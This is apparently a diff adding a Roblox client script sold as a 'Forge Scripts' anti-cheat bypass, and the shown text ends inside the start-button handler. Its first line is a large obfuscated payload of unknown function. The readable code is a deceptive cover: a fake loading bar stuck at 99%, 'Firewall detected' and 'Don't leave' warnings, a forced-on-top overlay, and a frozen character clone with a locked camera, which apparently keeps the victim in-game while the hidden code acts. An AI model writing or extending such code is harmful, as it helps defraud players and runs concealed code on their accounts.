@@ -1,1 +1,569 @@
---[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local S={"\111\116\082\071\090\109\101\119";"\090\121\050\061","\111\109\052\051\065\057\080\110","\102\043\088\049\102\078\105\107\090\116\111\061";"\104\110\082\122\065\068\080\065\057\106\089\049\082\078\076\061","\052\110\070\052\111\068\120\043\052\116\085\047\111\074\066\047","\111\047\082\074\090\057\082\074\053\077\052\070\053\116\103\119";"\090\121\089\061";"\101\119\072\115\075\121\119\075\066\077\082\116\122\057\080\109","\099\075\105\056\053\075\088\101\111\049\115\100\076\074\052\050","\066\104\119\087\052\109\105\118\075\116\052\047\104\047\052\077\066\106\117\061";"\053\047\088\114\053\047\115\074","\090\057\115\074\065\117\061\061","\099\079\061\061";"\090\043\088\070\101\078\066\074\111\116\119\114\101\067\061\061","\053\110\119\074\101\076\061\061";"\066\068\075\049\057\068\115\107\122\089\102\047\090\047\103\100\075\043\122\061";"\101\116\103\056\090\109\050\061";"\073\078\052\074\111\089\102\119\102\117\061\061","\111\043\066\070\090\043\067\061","\101\077\105\051\090\109\050\061";"\101\047\120\070\102\043\066\085","\102\043\115\112\090\043\075\061";"\099\112\079\119\101\069\085\107\099\079\061\061","\077\120\088\107\090\116\052\119\113\117\061\061","\111\116\115\114\101\043\088\071";"\101\047\115\071\101\076\061\061";"\104\052\072\106\057\074\077\071\066\111\070\104\114\114\090\085\108\056\084\085\047\116\050\055\098\069\099\068\108\118\049\056\105\043\077\100\119\086\120\105\108\104\075\073";"\077\120\088\110\053\067\061\061","\082\043\115\071\111\043\082\051\050\089\052\119\102\043\082\106\102\043\082\068\050\076\061\061","\090\043\082\114","\101\109\066\120\053\079\061\061","\076\109\053\061","\077\120\088\083\101\057\048\061","\113\057\050\103\090\104\102\070\066\109\076\048\101\057\115\085\111\079\061\061","\122\043\111\049\122\077\082\047\066\075\115\073\111\082\119\119";"\076\082\102\086\104\120\052\077\104\068\119\099\075\089\082\069","\113\104\101\118","\102\043\088\114\102\057\120\112\101\077\050\061";"\077\120\088\071\101\077\052\070\102\043\115\112\090\043\075\061";"\104\121\102\086\076\110\102\074\073\116\052\076\122\057\052\099","\053\047\070\070\111\079\061\061";"\111\115\115\097\122\115\070\100\075\109\072\074\102\115\053\049";"\102\057\080\067\053\057\066\086";"\090\089\105\047\065\043\067\109\101\078\107\118\113\089\119\107","\057\075\119\066\113\106\119\104\090\116\048\061",""}for v,x in ipairs({{-848977-(-848978);-543152-(-543199)},{-252206+252207;50814+-50811};{507138+-507134,-214852+214899}})do while x[809343+-809342]<x[-251041-(-251043)]do S[x[-200257-(-200258)]],S[x[-605721-(-605723)]],x[203949-203948],x[-722101+722103]=S[x[425507-425505]],S[x[-767233+767234]],x[839738-839737]+(881071-881070),x[110180-110178]-(766194+-766193)end end local function v(v)return S[v-(103387+-90895)]end do local v=string.len local x=table.insert local t=string.sub local L={Q=1040744-1040702;["\051"]=17129-17079;E=230280+-230278;z=333969-333957,O=481279-481247,Z=-671245+671272;I=455689+-455671;j=49294-49259;["\057"]=567416+-567394,f=-184293+184322;g=-706256+706305,n=-979693-(-979732);D=841361-841325;["\047"]=-450692-(-450746),["\056"]=83326+-83279,d=-855898+855908,H=-679621-(-679622);q=304668+-304638,P=405975+-405918;X=-405150+405211;x=-685501-(-685554),["\050"]=-664965-(-664973),k=342540+-342499;y=218765-218762;p=900986-900952,h=62408-62389,l=-213870-(-213932);S=-875672+875716,c=-194661+194675,T=-927769-(-927829);i=-681973+681982,u=823999-823999,r=519734-519688;b=-421726-(-421789),F=-90806-(-90839),N=-616149+616156;M=76074-76051,C=-818062-(-818110);t=-519041-(-519079),w=548072+-548035,v=363403+-363388;Y=935306-935302;K=-282097-(-282117);A=-42972-(-42998),["\054"]=-258048-(-258079);e=-642302-(-642327),["\052"]=-360334-(-360351),L=299907-299891,["\043"]=-552806-(-552812);m=-140494+140549,J=-363459-(-363511),a=-903011-(-903022);["\055"]=-404075+404134,["\053"]=-366990-(-367014);["\049"]=-955182-(-955233);G=-462783-(-462828);B=-137934-(-137947),W=-16298+16356,V=972343+-972300;o=690591-690563,["\048"]=-416471+416527,U=934161-934121,s=-818344+818349,R=-882749+882770}local N=type local G=string.char local P=S local p=math.floor local B=table.concat for S=550372-550371,#P,134685-134684 do local o=P[S]if N(o)=="\115\116\114\105\110\103"then local N=v(o)local f={}local w=479169+-479168 local g=351649+-351649 local e=162963+-162963 while w<=N do local S=t(o,w,w)local v=L[S]if v then g=g+v*(795297-795233)^((-127757+127760)-e)e=e+(-74239+74240)if e==595172+-595168 then e=-770233-(-770233)local S=p(g/(-325286-(-390822)))local v=p((g%(-947806+1013342))/(231649-231393))local t=g%(734220-733964)x(f,G(S,v,t))g=435295-435295 end elseif S=="\061"then x(f,G(p(g/(720188-654652))))if w>=N or t(o,w+(84692-84691),w+(181165-181164))~="\061"then x(f,G(p((g%(725107+-659571))/(-454319+454575))))end break end w=w+(-448657-(-448658))end P[S]=B(f)end end end return(function(S,t,L,N,G,P,p,k,c,e,w,l,o,E,n,C,f,B,g,x,T)f,g,T,x,n,w,e,E,C,B,o,c,l,k=function()w=w+(-924481-(-924482))o[w]=553896-553895 return w end,function(S)for v=-316029-(-316030),#S,-13475+13476 do o[S[v]]=o[S[v]]+(443296+-443295)end if L then local x=L(true)local t=G(x)t[v(342374-329854)],t[v(523512+-510988)],t[v(-738341+750870)]=S,e,function()return 555437+-3355286 end return x else return N({},{[v(182857-170333)]=e,[v(808841+-796321)]=S;[v(-600273+612802)]=function()return-3225735-(-425886)end})end end,function(S,v)local t=g(v)local L=function(...)return x(S,{...},v,t)end return L end,function(x,L,N,G)local a,T,u,q,w,F,d,Y,j,s,I,b,J,p,H,K,V,X,Z,e,D,M,r,h,z,y,A,R,O,U,o,g,W,Q while x do if x<-764072+8083563 then if x<-293153+2578020 then if x<1671570-340376 then if x<1523869-769404 then if x<-444980+868479 then if x<-711011+996826 then if x<663944+-543517 then x=true x=x and 2020766-683099 or 13946351-443737 else Y=x Q=-767343+767344 y=j[Q]Q=false u=y==Q H=u x=u and 8443169-(-176888)or 676109+13819620 end else O=v(775862+-763347)p=v(-115046-(-127580))e=v(-434502+447001)x=S[p]q=l(-721693+11007396,{})o=B[N[240921+-240917]]g=S[e]h=S[O]O={h(q)}r={t(O)}h=395265-395263 T=r[h]e=g(T)g=v(-842790+855309)w=o(e,g)o={w()}p=x(t(o))w=B[N[155046+-155041]]o=p x=w and 34003+7961085 or 11629327-(-324062)p=w end else if x<-167997+814171 then b=not J Z=Z+A p=Z<=X p=b and p b=Z>=X b=J and b p=b or p b=14494904-(-983321)x=p and b p=-458284+1991581 x=x or p else q=f()V=-293596+293661 U=-36854+36857 B[q]=p x=B[h]p=x(U,V)x=-636651+636651 U=f()B[U]=p V=x K=v(235040-222525)x=-4256-(-4256)p=S[K]A=v(-974786+987285)z=x s=c(5506322-(-234915),{})K={p(s)}x={t(K)}p=-765021+765023 K=x x=K[p]s=x p=v(-883797+896331)x=S[p]W=B[g]X=S[A]A=X(s)X=v(-208992-(-221511))Z=W(A,X)W={Z()}p=x(t(W))W=f()B[W]=p Z=B[U]X=Z Z=9640+-9639 A=Z Z=-155906+155906 p=-821691-(-821692)x=216895-(-406288)J=A<Z Z=p-A end end else if x<-22436+1093259 then if x<839792+38978 then W=#K J=-743808+743808 s=W==J x=s and 10375279-573413 or-64347+7601313 else g=320234-320234 o=v(-454617+467133)x=S[o]w=B[N[103570+-103562]]o=x(w,g)x=1613025-389997 end else if x<2214400-1042072 then w=B[N[5088+-5085]]g=352259-352227 q=-228519+228521 o=w%g e=B[N[121442+-121438]]V=-1035613-(-1035626)h=B[N[829848+-829846]]s=B[N[-762674+762677]]K=s-o s=413677+-413645 z=K/s U=V-z O=q^U q=-726126+726382 r=h/O T=e(r)e=-862701+4295829997 g=T%e T=-1037123+1037125 e=T^o w=g/e O=778237+-778236 e=B[N[-756678+756682]]h=w%O O=4294724207-(-243089)r=h*O T=e(r)e=B[N[-990439-(-990443)]]r=e(w)g=T+r T=333892+-268356 e=g%T r=g-e h=-276754-(-342290)T=r/h h=-1035248+1035504 V=190187+-189931 g=nil r=e%h O=e-r h=O/q e=nil q=-37590+37846 O=T%q w=nil U=T-O q=U/V U={r;h;O;q}T=nil B[N[-10806-(-10807)]]=U h=nil r=nil o=nil x=2791879-564559 q=nil O=nil else w=973672-973671 g=B[N[972111+-972102]]x={}e=g o=x g=171979+-171978 T=g g=-710270+710270 r=T<g x=9266523-(-20742)g=w-T end end end else if x<1378675-(-179923)then if x<1376729-(-39855)then if x<1789039-432026 then if x<-494314+1832683 then x=2035161-533841 else x=407618+7077671 end else B[w]=Z x=B[w]x=x and 914661+1378365 or 13850135-228639 end else if x<195002+1329503 then x=true x=x and-934247+15877660 or-659740+10228535 else X=B[w]Z=X x=X and-171361+12569829 or 1231831-(-143454)end end else if x<2456197-664611 then if x<19817+1639344 then Y=B[w]H=Y x=Y and 792381+9365032 or 8499121-(-540055)else M=C(M)d=C(d)x=920427+-297244 I=C(I)R=C(R)F=C(F)j=nil b=C(b)end else if x<1760588-(-410097)then s=W x=15284758-364607 d=s K[s]=d s=nil else g=v(-44513+57031)w=S[g]g=v(-280519-(-293015))o=w[g]g=B[N[-871625-(-871626)]]w={o(g)}p={t(w)}x=S[v(-467479+479980)]end end end end else if x<3826396-(-715174)then if x<4499814-432067 then if x<730182+2730898 then if x<2197036-(-966674)then if x<1989064-(-899499)then x=3215641-(-999707)else x=S[v(317679-305167)]p={w}end else x=-224420+16373181 r=B[T]p=r end else if x<3945025-353328 then B[w]=p x=-470767+2154561 else g=418524+-418523 w=B[N[-964294+964297]]o=w~=g x=o and 441998+665017 or 98811+4238490 end end else if x<-195216+4529041 then if x<20078+4144402 then w=B[N[-756436+756438]]g=-366250+366443 o=w*g w=21190967885915-88528 p=o+w o=35184373136186-1047354 w=337673-337672 x=p%o B[N[-776684-(-776686)]]=x o=B[N[-441602+441605]]p=o~=w x=942050+3395251 else K=nil T=C(T)w=C(w)z=nil O=nil g=C(g)r=nil U=C(U)g=nil r=v(989787-977279)O=v(575618+-563100)V=nil q=C(q)W=C(W)w=nil K={}s=nil W=-902375+902631 e=C(e)h=C(h)J=W T=S[r]r=v(-36912-(-49425))e=T[r]T=f()h=v(1035286-1022778)B[T]=e r=S[h]h=v(10099-(-2422))e=r[h]U=f()q=v(686719+-674221)h=S[O]O=v(230109-217613)z=f()r=h[O]W=-981529-(-981530)O=S[q]q=v(740470+-727933)h=O[q]b=W x=15212972-292821 V={}W=906719-906719 O=127715-127715 q=f()B[q]=O O=229389+-229387 B[U]=O B[z]=V O={}I=b<W s=-346050-(-346051)V=202964+-202964 W=s-b end else if x<-153270+4521663 then g=-548432-(-548477)w=B[N[-357914+357917]]o=w*g w=916139-915882 x=4262628-228400 p=o%w B[N[929046+-929043]]=p else q=-237423-(-237678)x=B[N[902312+-902311]]O=-912845-(-912845)h=x(O,q)w=g o[w]=h x=10180035-892770 w=nil end end end else if x<6155941-258466 then if x<4668020-(-871746)then if x<4095583-(-872826)then if x<5343494-550014 then x=-714739+2216059 else H=B[w]p=H x=H and-146289-(-319286)or 3565432-92245 end else x=B[N[843007-843006]]o=L[325967+-325966]g=x w=L[810788+-810786]x=g[w]x=x and-60562+12799757 or 247108+9553807 end else if x<869981+4838383 then x=-297619+6196722 K=v(235800+-223282)z=S[K]K=v(-22336-(-34875))V=z[K]q=V else g=-253880+16946188 w=v(-192289-(-204817))p=6822402-(-656149)o=w^g x=p-o o=x p=v(48256+-35762)x=p/o p={x}x=S[v(-861569-(-874105))]end end else if x<6902888-380898 then if x<5730140-(-510162)then x=U x=q and-3389-(-660624)or 6798904-214347 p=q else p=v(-89173-(-101670))o=v(754969-742466)x=S[p]p=S[o]o=v(348377+-335874)S[o]=x o=v(-586029-(-598526))S[o]=p o=B[N[-583861-(-583862)]]w=o()x=811980+6673309 end else if x<416107+6220486 then U=v(905984+-893445)q=S[U]x=303162+354073 p=q else J=v(-744596-(-757093))x=S[J]J=v(430893+-418390)S[J]=x x=1028158+3612115 end end end end end else if x<633305+11488154 then if x<-417435+9464670 then if x<-193045+8582589 then if x<8329261-375860 then if x<6948928-(-906241)then if x<8194562-689323 then x=true x=x and 120166+6334073 or 14125164-774584 else J=#K W=-815618-(-815619)s=e(W,J)W=r(K,s)s=nil x=1324628-562502 d=1012896+-1012895 J=B[z]I=W-d b=h(I)J[W]=b W=nil end else A=v(-119907-(-132405))O=U X=S[A]A=v(-532639+545150)Z=X[A]X=Z(o,O)Z=B[N[334266-334260]]A=Z()W=X+A s=W+r W=652875+-652619 K=s%W x=-389772+16810373 W=g[w]A=771030+-771029 O=nil r=K X=r+A Z=e[X]s=W..Z g[w]=s end else if x<-677865+8862524 then g=B[N[995643-995637]]x=11512982-(-440407)w=g==o p=w else x=true B[N[225753-225752]]=x x=S[v(-14204+26735)]p={}end end else if x<-204931+8731058 then if x<-388216+8888612 then b=v(857677-845174)A=v(-585962-(-598461))x=S[A]J=S[b]A=x(J)x=v(-160286-(-172783))S[x]=A x=3705216-(-935057)else w=B[N[970080-970078]]g=B[N[896513-896510]]o=w==g x=922001+8697408 p=o end else if x<-602395+9291312 then x=-642822+15138551 Q=-86010+86012 y=j[Q]Q=B[M]u=y==Q H=u else a=-112893-(-112894)B[w]=H Q=B[F]y=Q+a u=j[y]Y=V+u u=91285-91029 x=Y%u V=x y=B[d]u=z+y y=366894+-366638 x=962299-(-721495)Y=u%y z=Y end end end else if x<9436245-(-662417)then if x<10594420-918270 then if x<-708357+10316808 then if x<-472062+9939442 then h=not r g=g+T w=g<=e w=h and w h=g>=e h=r and h w=h or w h=3954453-(-538935)x=w and h w=678425+13888456 x=x or w else p={}x=S[v(-254199-(-266731))]end else x=p and 632387+-327860 or-307749+16305751 end else if x<9089820-(-711705)then x={}T=35184372102445-13613 B[N[-886527-(-886529)]]=x p=B[N[-114225-(-114228)]]e=p h=-729167+729422 p=w%T B[N[-788772+788776]]=p r=w%h h=349565+-349563 T=r+h x=226445+16194156 O=v(-953914+966412)B[N[65566+-65561]]=T h=S[O]O=v(-469758+482284)r=h[O]h=r(o)O=-346757+346758 r=v(-990712-(-1003207))g[w]=r U=264408-264407 r=-754597+754756 q=h V=U U=336858+-336858 z=V<U U=O-V else j=v(-463710-(-476245))u=nil W=f()V=nil b=f()K=nil h=nil I=v(-1000380-(-1012882))s={}B[W]=s s=f()J=k(12830593-(-825802),{W,q,U,T})R=v(677399+-664879)B[s]=J r=nil J={}V=713085+975395463241 T=C(T)e=nil B[b]=J d={}J=S[I]M=B[b]F={[R]=M;[j]=u}p={}O=nil I=J(d,F)J=l(5293888-248048,{b;W;z,q;U,s})z=C(z)b=C(b)w=I s=C(s)W=C(W)h=v(-271918-(-284440))q=C(q)g=J T=v(-69213-(-81723))e=S[T]r=S[h]U=C(U)U=v(667563+-655040)q=g(U,V)O=w[q]q=v(709912-697398)g=nil x=S[v(-281907+294412)]w=nil q=r[q]h={q(r,O)}T=e(t(h))e=T()end end else if x<10467838-(-88574)then if x<437499+9791748 then u=258074+-258073 Y=j[u]H=Y x=457106+8582070 else w=v(431050+-418550)p=7642298-(-343536)g=7267412-(-717045)o=w^g x=p-o p=v(-901049+913582)o=x x=p/o p={x}x=S[v(207959+-195455)]end else if x<11115144-(-775515)then o=L g=v(943469-930971)x=true h=v(964039+-951524)w=f()B[w]=x p=S[g]g=v(64861+-52344)x=p[g]g=f()e=f()B[g]=x x=n(-115434+15597901,{})B[e]=x T=f()x=false B[T]=x r=S[h]O=n(8534130-145123,{T})h=r(O)x=h and-351042+3672593 or 15209715-(-939046)p=h else B[N[-264215-(-264220)]]=p x=782959+15215043 o=nil end end end end else if x<-415796+15084871 then if x<13969889-321480 then if x<-815872+14291542 then if x<849325+12162689 then if x<752792+11976301 then X=V==z x=-1026398+2401683 Z=X else x=-947997+4069584 end else p={}x=S[v(672780-660250)]end else if x<684246+12914955 then x=E(1959024-620330,{e})X={x()}p={t(X)}x=S[v(-76905+89411)]else x=true x=13684751-182137 end end else if x<870478+13479139 then if x<14482971-489660 then o=B[N[453355-453354]]p=#o o=-499100-(-499100)x=p==o x=x and-848621+4960116 or 1862714-(-364606)else J=607376-607376 x=-336085+7873051 W=#K s=W==J end else if x<156957+14374357 then p=H x=Y x=458508+3014679 else x=B[N[720424+-720414]]w=B[N[-710450+710461]]o[x]=w x=B[N[336681+-336669]]w={x(o)}p={t(w)}x=S[v(1113-(-11380))]end end end else if x<-323033+15854879 then if x<-476591+15455617 then if x<484589+14438232 then if x<607913+14133433 then h=nil x=4158472-1036885 r=nil e=nil else d=not I W=W+b s=W<=J s=d and s d=W>=J d=I and d s=d or s d=601996+1334866 x=s and d s=-116202+14388866 x=x or s end else J=-99680+99686 A=-1017034+1017035 x=B[h]X=x(A,J)x=v(819677-807180)S[x]=X J=v(890345+-877848)A=S[J]J=-387791+387793 x=A>J x=x and 7644579-(-745080)or 6760001-(-176325)end else if x<15894413-414303 then I=v(53984+-41476)F=-991218+991473 d=-1029135-(-1029235)b=f()B[b]=Z p=S[I]I=v(665312+-652791)D=87902+-77902 x=p[I]M=-509252+509253 j=-907222+907224 I=587831+-587830 p=x(I,d)I=f()B[I]=p d=-423113-(-423113)x=B[h]p=x(d,F)d=f()B[d]=p x=B[h]F=-798317+798318 R=B[I]p=x(F,R)a=-786754-(-786754)F=f()B[F]=p p=B[h]R=p(M,j)p=-665399-(-665400)j=v(-700086-(-712595))x=R==p p=v(-627815+640334)u=v(-383732+396231)R=f()B[R]=x Y=S[u]y=B[h]Q={y(a,D)}x=v(227259-214732)x=s[x]u=Y(t(Q))Y=v(-788429+800938)H=u..Y M=j..H x=x(s,p,M)M=f()j=v(843002-830487)B[M]=x H=c(15357679-(-537828),{h;b,U;g;w,W;R;M;I,F,d;q})p=S[j]j={p(H)}x={t(j)}j=x x=B[R]x=x and-703590+5566656 or 1814080-194972 else p=v(64928-52412)x=S[p]o=v(622526-610001)p=x(o)x=S[v(380914+-368376)]p={}end end else if x<-893733+16913932 then if x<958063+14946725 then T=685926+-685924 e=621903-621902 w=B[N[-884223-(-884224)]]g=w(e,T)w=-24758+24759 o=g==w x=o and 898609+8720800 or 7948315-(-566235)p=o else x=B[N[434604-434597]]x=x and 1309409-391668 or 645034+577994 end else if x<15662165-(-658021)then h=v(511594+-499086)r=p p=S[h]h=v(400763-388242)x=p[h]h=f()O=v(-211501-(-224019))B[h]=x p=S[O]z=v(-361643+374161)O=v(-357956-(-370463))x=p[O]O=x V=S[z]U=x x=V and 5267585-(-327825)or 6924866-1025763 q=V else K=not z U=U+V O=U<=q O=K and O K=U>=q K=z and K O=K or O K=7015157-(-928693)x=O and K O=14495785-(-180272)x=x or O end end end end end end end x=#G return t(p)end,function(S,v)local t=g(v)local L=function(L)return x(S,{L},v,t)end return L end,-486657+486657,function(S)local v,x=-924292-(-924293),S[-600321+600322]while x do o[x],v=o[x]-(444292-444291),(505297-505296)+v if o[x]==523234+-523234 then o[x],B[x]=nil,nil end x=S[v]end end,function(S,v)local t=g(v)local L=function(L,N)return x(S,{L;N},v,t)end return L end,function(S)o[S]=o[S]-(118585+-118584)if 993864+-993864==o[S]then o[S],B[S]=nil,nil end end,{},{},function(S,v)local t=g(v)local L=function(L,N,G,P)return x(S,{L,N,G;P},v,t)end return L end,function(S,v)local t=g(v)local L=function(L,N,G,P,p)return x(S,{L,N;G;P;p},v,t)end return L end,function(S,v)local t=g(v)local L=function()return x(S,{},v,t)end return L end return(T(-6637+11538212,{}))(t(p))end)(getfenv and getfenv()or _ENV,unpack or table[v(-505672-(-518211))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+-- POLISHED FORGE GUI + STUCK 99% FIREWALL + THIRD-PERSON CLONE WITH TEXT & CHAT HIDING
+-- CLIENT SIDE ONLY
+
+--------------------------------------------------
+-- SERVICES
+--------------------------------------------------
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local ChatService = game:GetService("Chat")
+local TextChatService = game:GetService("TextChatService")
+local Lighting = game:GetService("Lighting")
+
+--------------------------------------------------
+-- PLAYER
+--------------------------------------------------
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local Camera = workspace.CurrentCamera
+
+--------------------------------------------------
+-- REMOVE OLD GUI
+--------------------------------------------------
+pcall(function()
+	local old = PlayerGui:FindFirstChild("PolishedForgeGUI")
+	if old then old:Destroy() end
+end)
+
+--------------------------------------------------
+-- GUI ROOT
+--------------------------------------------------
+local gui = Instance.new("ScreenGui")
+gui.Name = "PolishedForgeGUI"
+gui.ResetOnSpawn = false
+gui.Parent = PlayerGui
+gui.DisplayOrder = 999999999  -- Extremely high display order
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+--------------------------------------------------
+-- MAIN FRAME
+--------------------------------------------------
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 360, 0, 280)
+frame.Position = UDim2.new(0.5, -180, 0.4, -140)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+frame.ZIndex = 999999999  -- Max ZIndex for frame
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 22)
+frameCorner.Parent = frame
+
+--------------------------------------------------
+-- TITLE
+--------------------------------------------------
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 15)
+title.BackgroundTransparency = 1
+title.Text = "YouTube: Forge Scripts"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 32
+title.TextColor3 = Color3.new(1,1,1)
+title.Parent = frame
+title.ZIndex = 999999999  -- Max ZIndex for title
+
+--------------------------------------------------
+-- LOADING BAR
+--------------------------------------------------
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0, 280, 0, 18)
+barBg.Position = UDim2.new(0.5, -140, 0, 95)
+barBg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+barBg.BorderSizePixel = 0
+barBg.Parent = frame
+barBg.ZIndex = 999999999  -- Max ZIndex for bar background
+
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(0, 9)
+barBgCorner.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+barFill.ZIndex = 999999999  -- Max ZIndex for bar fill
+
+local barFillCorner = Instance.new("UICorner")
+barFillCorner.CornerRadius = UDim.new(0, 9)
+barFillCorner.Parent = barFill
+
+--------------------------------------------------
+-- SUBTITLE
+--------------------------------------------------
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, 0, 0, 26)
+subtitle.Position = UDim2.new(0, 0, 0, 125)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Initializing bypass"
+subtitle.Font = Enum.Font.SourceSans
+subtitle.TextSize = 20
+subtitle.TextColor3 = Color3.new(1,1,1)
+subtitle.Parent = frame
+subtitle.ZIndex = 999999999  -- Max ZIndex for subtitle
+
+--------------------------------------------------
+-- FIREWALL STATUS
+--------------------------------------------------
+local firewallLabel = Instance.new("TextLabel")
+firewallLabel.Size = UDim2.new(1, 0, 0, 22)
+firewallLabel.Position = UDim2.new(0, 0, 0, 150)
+firewallLabel.BackgroundTransparency = 1
+firewallLabel.Text = ""
+firewallLabel.Font = Enum.Font.SourceSans
+firewallLabel.TextSize = 18
+firewallLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+firewallLabel.Visible = false
+firewallLabel.Parent = frame
+firewallLabel.ZIndex = 999999999  -- Max ZIndex for firewall label
+
+--------------------------------------------------
+-- DON'T LEAVE TEXT
+--------------------------------------------------
+local dontLeaveLabel = Instance.new("TextLabel")
+dontLeaveLabel.Size = UDim2.new(1, 0, 0, 20)
+dontLeaveLabel.Position = UDim2.new(0, 0, 0, 172)
+dontLeaveLabel.BackgroundTransparency = 1
+dontLeaveLabel.Text = ""
+dontLeaveLabel.Font = Enum.Font.SourceSans
+dontLeaveLabel.TextSize = 16
+dontLeaveLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+dontLeaveLabel.Visible = false
+dontLeaveLabel.Parent = frame
+dontLeaveLabel.ZIndex = 999999999  -- Max ZIndex for dont leave label
+
+--------------------------------------------------
+-- START BUTTON
+--------------------------------------------------
+local startButton = Instance.new("TextButton")
+startButton.Size = UDim2.new(0, 190, 0, 42)
+startButton.Position = UDim2.new(0.5, -95, 0, 185)
+startButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+startButton.Text = "Start bypassing"
+startButton.Font = Enum.Font.SourceSansBold
+startButton.TextSize = 22
+startButton.TextColor3 = Color3.new(1,1,1)
+startButton.Parent = frame
+startButton.ZIndex = 999999999  -- Max ZIndex for button
+
+local startButtonCorner = Instance.new("UICorner")
+startButtonCorner.CornerRadius = UDim.new(0, 14)
+startButtonCorner.Parent = startButton
+
+--------------------------------------------------
+-- FORCE GUI TO ALWAYS BE ON TOP
+--------------------------------------------------
+-- Continuously force the GUI to be on top
+local forceTopConnection = RunService.RenderStepped:Connect(function()
+    if gui and gui.Parent then
+        gui.DisplayOrder = 999999999
+        -- Re-parent if needed (some games try to move UI)
+        if gui.Parent ~= PlayerGui then
+            gui.Parent = PlayerGui
+        end
+    end
+end)
+
+-- Also force after any potential UI refresh
+if not _G.ForgeUIConnections then
+    _G.ForgeUIConnections = {}
+end
+table.insert(_G.ForgeUIConnections, forceTopConnection)
+
+--------------------------------------------------
+-- LOADING BAR LOGIC
+--------------------------------------------------
+local loading = false
+local progress = 0
+local firewallActive = false
+
+local TOTAL_TIME = 120
+local TARGET = 0.99
+
+local function startLoadingBar()
+	loading = true
+	barFill.Size = UDim2.new(0, 0, 1, 0)
+
+	local stepInterval = 0.6
+	local totalSteps = TOTAL_TIME / stepInterval
+
+	task.spawn(function()
+		for i = 1, totalSteps do
+			if not loading then break end
+			local chunk = math.random(1, 2) / 100
+			progress = math.clamp(progress + chunk, 0, TARGET)
+
+			TweenService:Create(
+				barFill,
+				TweenInfo.new(stepInterval, Enum.EasingStyle.Linear),
+				{ Size = UDim2.new(progress, 0, 1, 0) }
+			):Play()
+
+			if progress >= TARGET and not firewallActive then
+				firewallActive = true
+				firewallLabel.Visible = true
+				dontLeaveLabel.Visible = true
+			end
+
+			task.wait(stepInterval)
+		end
+	end)
+
+	task.spawn(function()
+		local dots = 0
+		while loading do
+			local dotStr = string.rep(".", dots)
+			subtitle.Text = "Bypassing Anti-cheat" .. dotStr
+			if firewallActive then
+				firewallLabel.Text = "Firewall detected" .. dotStr
+				dontLeaveLabel.Text = "Don't leave while bypassing" .. dotStr
+			end
+			dots = (dots + 1) % 4
+			task.wait(0.6)
+		end
+	end)
+end
+
+--------------------------------------------------
+-- FIX BLURRY EFFECT BY DISABLING DEPTH OF FIELD
+--------------------------------------------------
+local function disableBlurEffects()
+	-- Disable DepthOfField effect
+	if Lighting:FindFirstChildOfClass("DepthOfFieldEffect") then
+		Lighting:FindFirstChildOfClass("DepthOfFieldEffect").Enabled = false
+	end
+	
+	-- Disable any other blur effects
+	for _, effect in ipairs(Lighting:GetChildren()) do
+		if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") then
+			effect.Enabled = false
+		end
+	end
+	
+	-- Also check Camera for effects
+	if Camera:FindFirstChildOfClass("DepthOfFieldEffect") then
+		Camera:FindFirstChildOfClass("DepthOfFieldEffect").Enabled = false
+	end
+end
+
+--------------------------------------------------
+-- THIRD PERSON FREEZE
+--------------------------------------------------
+local CAMERA_DISTANCE = 8
+local CAMERA_HEIGHT = 3
+local clone = nil
+local originalCharacter = nil
+
+local function freezeVisuals()
+	disableBlurEffects() -- Fix blurry effect
+	
+	originalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local success, errorMsg = pcall(function()
+		originalCharacter.Archivable = true
+	end)
+	
+	if not success then
+		warn("Could not archive character: " .. tostring(errorMsg))
+		return
+	end
+	
+	clone = originalCharacter:Clone()
+	clone.Name = "VisualClone"
+	clone.Parent = workspace
+
+	for _, v in ipairs(clone:GetDescendants()) do
+		if v:IsA("BasePart") then
+			v.Anchored = true
+			v.CanCollide = false
+		elseif v:IsA("Motor6D") then
+			v.Enabled = false
+		end
+	end
+
+	if clone:FindFirstChild("HumanoidRootPart") then
+		clone.HumanoidRootPart.CFrame = originalCharacter.HumanoidRootPart.CFrame
+	else
+		clone:Destroy()
+		warn("No HumanoidRootPart found in clone")
+		return
+	end
+	
+	-- DON'T disable chat icon - only hide chat bubbles
+	-- StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) -- REMOVED THIS LINE
+	
+	-- Connect camera update
+	local cameraConnection = RunService.RenderStepped:Connect(function()
+		if clone and clone.Parent and clone:FindFirstChild("HumanoidRootPart") then
+			local look = clone.HumanoidRootPart.CFrame.LookVector
+			local pos = clone.HumanoidRootPart.Position - look * CAMERA_DISTANCE + Vector3.new(0, CAMERA_HEIGHT, 0)
+			Camera.CFrame = CFrame.lookAt(pos, clone.HumanoidRootPart.Position + Vector3.new(0, CAMERA_HEIGHT, 0))
+		end
+	end)
+	
+	return cameraConnection
+end
+
+--------------------------------------------------
+-- START BUTTON ACTION
+--------------------------------------------------
+startButton.MouseButton1Click:Connect(function()
+	startButton.Visible = false
+	startLoadingBar()
